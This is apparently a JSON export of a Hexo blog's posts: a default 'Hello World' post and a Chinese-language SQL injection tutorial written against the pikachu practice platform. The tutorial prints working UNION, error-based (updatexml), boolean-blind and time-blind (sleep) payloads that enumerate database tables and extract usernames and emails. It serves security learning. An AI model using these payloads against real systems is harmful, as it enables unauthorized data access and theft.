[{"title":"Hello World","url":"/2021/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":["World"],"tags":["Hello"]},{"title":"SQL-SQL注入基础","url":"/2021/SQL-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","content":"SQL-SQL注入基础SQL注入即开发者对用户输入参数没有做到严格过滤，导致用户输入数据能够影响预设的查询功能\n通常表现为数据库原有信息被泄露、篡改，甚至删除\nUNION注入-数字型注入前提：用户通过传入的id等参数，可以从数据库中查询相应的记录\n对字符型注入的判断：判断输入值有无数字运算的特征行为\n例如：输入id=2与id=3-1得到的反馈是相同的，即该注入点为数字型注入\n以pikachu漏洞练习平台上题目为例\nSQL-Inject/数字型注入（post）\n使用BURPSUITE修改post请求\n\nid=3\n\nid=5-2\n\n可见id值为“3”与id值为“5-2”所得反馈相同\n即该注入点为数字型注入\n使用UNION并入SQL查询语句来干扰正常查询\n在确定为数字型注入后，使用order by 1-99语句查询该数据表的字段数量\nid=1 order by 2\n\n返回界面与id=1时相同\nid=1 order by 3\n\n出现了错误\n即在该环境中，通过order by查询得到的字段数为2\n故union注入的语句如下：\nunion select 1,2\n\n访问id=1 union select 1,2\n\n既执行了id=1的查询，也执行了union后的查询\n指定id=-1或一个很大的值，使其无法正常执行原查询，则会执行union后的查询\n将union select 1,2中的1或2修改成需要的查询语句\n例如：\nid=-1 union select 1,database()或id=-1 union select database(),2\n\ndatabase()函数用于查询当前数据库名，即可得到该数据库名为“pikachu“\n\n之后可通过修改查询语句进行对数据库的查询\n查询表名\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27;\n\n这里只显示第一项记录\n\n在原有数据后面加上”limit 1,1“参数即可显示第二条记录\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 1,1\n\n”limit 1,1“即为条件限定，取查询结果第一条记录的后一条记录\n\n同理”limit 2,1“为限定查询结果第二条记录的后一条记录\n同理”limit 0,100“为限定查询结果的前一百条记录\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,100\n\n\n亦可使用”group_concat“来用”,“联合多行记录\nid=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #查询所有表名或id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27; #查询“pikachu”库下所有表名\n\n\n继续查询所需要的\nid=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;member&#x27;id=-1 union select username,email from member\n\n最后查询对应的”username“与”email“即可\n\nUNION注入-字符型注入GET参数输入的地方包裹单引号，变成字符串\n注入方式：尝试闭合前面单引号，且注释后面的语句\n即：使用单引号闭合前面单引号，使用注释符号注释后面语句\n常用注释：”#“、”/**/“\n构造时应使用符号的url编码\n空格：”%20“，”#“：”%23“，”‘“：”%27“\nurl中构造\nkobe%27union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23\n\n结果如下：\n\n修改union后面的查询语句即可继续查询所需的内容\n报错注入利用页面报错信息获取数据\n常用于报错注入的函数：\n\nupdatexml()： MySQL对XML文档数据进行查询和修改的XPATH函数\n\n\nextractvalue()：MySQL对XML文档数据进行查询的XPATH函数\n\n\nfloor()：MySQL中用来取整的函数\n\nUPDATEXML (XML_document, XPath_string, new_value);\n\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n\n\n第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程\n\n\n第三个参数：new_value，String格式，替换查找到的符合条件的数据\n\n\n作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值\n\n测试题：pikachu漏洞练习平台/数字型注入(post)\n通过报错信息查询数据库名称\nid=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)\n\n\n将database()函数替换为其他查询语句即可\n布尔盲注通过注入得到的真假回显推测出数据\n测试环境：pikachu漏洞练习平台\n添加”and“，”and“两边需同时满足查询才可执行\n测试题：pikachu漏洞练习平台/数字型注入(post)\n判断数据库名的长度\nid=1 and length(database())&gt;=7\n\n执行成功\nid=1 and length(database())&gt;=8\n\n不能执行\n上文可知该数据库名为”pikachu“，为7位字符\n判断数据库的名称\nid=1 and substr(database(),1,1)&gt;&#x27;a&#x27;\n\n执行成功\nsubstr()函数功能为截取，“1,1”即截取database()中从第一个开始字符，返回一个字符，这点与limit不同\n即可使用二分法去猜测字符\nid=1 and substr(database(),1,1)&gt;&#x27;p&#x27;\n\n执行成功\nMySQL自带的截取函数：substring(),mid(),substr()\n将database()函数换成其他查询语句，即可查询所需\n如若改变测试题为：pikachu漏洞练习平台/字符型注入(get)\nget型要注意url编码,而字符型需要构造闭合，且需要注释，故构造如下\nkobe%27%20and%20length(database())&gt;1%23\n\n执行成功\n其他具体查询就与前文类似\n在数字型与字符型分别访问以下两个\nid= 1 or 1=1kobe%27%20or%201=1%23\n\n由于1=1是永真条件，页面定能执行，返回出来的东西还会有惊喜\n时间盲注某些情况下页面回显内容是完全一致的，可通过增加语句执行时需要等待的时间来判断查询是否为有效查询\n测试题：pikachu漏洞练习平台/字符型注入(get)\n访问\nkobe&#x27; and sleep(3)#\n\n后台等待三秒才开始执行\n\n判断数据库名\nkobe&#x27; and if((substr(database(), 1, 1))=&#x27;p&#x27;, sleep(3), null)#\n\n延迟了三秒，证明查询成功，数据库名第一个字母为“p”\n可通过这种特性，查询所需内容，具体与布尔盲注类似\n总结注入技巧使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注\n","categories":["CTF-WEB"],"tags":["SQL"]}]